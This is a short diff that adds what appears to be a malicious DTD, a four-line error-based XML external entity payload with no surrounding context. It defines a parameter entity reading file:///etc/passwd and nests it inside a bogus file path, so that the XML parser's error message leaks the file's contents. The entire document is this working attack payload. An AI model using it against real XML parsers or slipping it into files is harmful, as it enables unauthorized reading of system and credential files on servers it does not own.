@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % wrapper "<!ENTITY &#x25; invoke SYSTEM 'file:///abc/%file;'>">
+%wrapper;
+%invoke;
